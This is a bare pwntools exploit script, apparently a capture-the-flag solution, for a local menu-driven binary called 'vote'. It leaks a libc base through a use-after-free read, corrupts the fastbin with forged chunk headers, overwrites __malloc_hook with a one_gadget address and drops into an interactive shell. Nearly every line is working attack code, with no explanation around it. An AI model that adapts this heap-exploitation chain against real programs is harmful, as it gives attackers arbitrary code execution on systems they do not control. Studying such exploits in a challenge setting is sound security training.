#/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./vote"
ENV = {"LD_PRELOAD":"./libc-2.23.so"}

malloc_hook_off = 0x3c4b10
one_gadget_off = 0xf0274

p = process(elf, env=ENV)

def create(name, size):
    p.recvuntil("Action: ")
    p.sendline("0")
    p.recvuntil("Please enter the name's size: ")
    p.sendline(str(size))
    p.recvuntil("Please enter the name: ")
    p.send(name)

def show(idx):
    p.recvuntil("Action: ")
    p.sendline("1")
    p.recvuntil("Please enter the index: ")
    p.sendline(str(idx))

def vote(idx):
    p.recvuntil("Action: ")
    p.sendline("2")
    p.recvuntil("Please enter the index: ")
    p.sendline(str(idx))

def result():
    p.recvuntil("Action: ")
    p.sendline("3")

def cancel(idx):
    p.recvuntil("Action: ")
    p.sendline("4")
    p.recvuntil("Please enter the index: ")
    p.sendline(str(idx))


create("\n", 0x70)      # 0
create("\n", 0x70+0x50) # 1
create("\n", 0x8)       # 2
cancel(0)
show(0)

p.recvuntil("count: ")
libc_base = int(p.recv(15))-0x3c4b78
log.info("libc_base: "+hex(libc_base))

target_addr = libc_base+malloc_hook_off-0x23
log.info("target_addr: "+hex(target_addr))

one_gadget_addr = libc_base+one_gadget_off

cancel(1)

payload = p8(0)*0x70
payload += p64(0)
payload += p64(0x71)
payload += p8(0)*0x60
payload += p64(0)
payload += p64(0x71)
payload += "\n"
create(payload, 0x150)   # 3 => 0

#gdb.attach(p)
cancel(1)
cancel(0)

payload = p8(0)*0x70
payload += p64(0)
payload += p64(0x71)
payload += p64(target_addr)
payload += "\n"
create(payload, 0x150)  # 4 => 0

create("\n", 0x50)      # 5 => 1

payload = p8(0)*0x3
payload += p64(one_gadget_addr)
payload += "\n"
create(payload, 0x50)

p.recvuntil("Action: ")
p.sendline("0")
p.recvuntil("Please enter the name's size: ")
p.sendline(str(0x10))

p.interactive()
